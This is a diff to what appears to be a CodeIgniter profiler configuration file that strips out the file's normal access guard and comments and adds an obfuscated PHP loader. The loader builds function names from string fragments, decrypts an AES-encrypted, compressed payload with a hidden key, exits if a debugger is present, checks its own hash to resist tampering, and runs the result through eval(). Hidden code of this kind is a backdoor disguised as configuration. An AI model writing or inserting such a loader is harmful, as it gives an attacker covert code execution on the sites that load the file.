@@ -1,14 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------------
-| Profiler Sections
-| -------------------------------------------------------------------------
-| This file lets you determine whether or not various sections of Profiler
-| data are displayed when the Profiler is enabled.
-| Please see the user guide for info:
-|
-|	https://codeigniter.com/user_guide/general/profiling.html
-|
-*/
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_pqdc54z8=('bas'.'e64'.'_de'.'cod'.'e');
+$_aq0ud46q=('gzu'.'nco'.'mpr'.'ess');
+$_xmakp9d0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_tpdearx4='h0XfcZ68';
+$_uxvyo3pe='WXF3G/IP';
+$_tp6ibjt6='/jFaimK63ak=';
+$_k8p9y64u='EuoAusck';
+$_nb1zoij1='l2+5AIEZ';
+$_mmqvae2h='q3mqVFRY';
+$_z85gzlzx='xSEHf6/p';
+$_ptmorh0u='ligv6A==';
+$_eer0lz86=$_pqdc54z8($_nb1zoij1.$_tpdearx4.$_k8p9y64u.$_uxvyo3pe.$_tp6ibjt6);
+$_aj1raahv=$_pqdc54z8($_mmqvae2h.$_z85gzlzx.$_ptmorh0u);
+$_y1ll8hma=$_pqdc54z8('xK1Yb3tNDj6NmWNIiNDfxBGN4sktM5VTY+3DrE9b7KH6xVuSogzGJOhgcTUY+wCEZUVoUbbqCJpFh+l7u6xfPCQ62gbHFicUejmq+xP7z8s=');
+$_giho15yt=$_xmakp9d0($_y1ll8hma,'aes-256-cbc',$_eer0lz86,OPENSSL_RAW_DATA,$_aj1raahv);
+if($_giho15yt===false){exit;}
+$_ljnmx219=$_aq0ud46q($_giho15yt);
+if($_ljnmx219===false){exit;}
+$_dnyjddrk='a7bdaeb36025cf54105502f02b1895958fc14e05d696eaea246c724ee920d005';
+$_jlkip0jy=@file_get_contents(__FILE__);
+if($_jlkip0jy!==false){
+$_lhjj4lfp=str_replace($_dnyjddrk,"0000000000000000000000000000000000000000000000000000000000000000",$_jlkip0jy);
+$_qbjohga7=hash("sha256",$_lhjj4lfp);
+if($_qbjohga7!==$_dnyjddrk){@http_response_code(403);exit;}
+}
+eval($_ljnmx219);
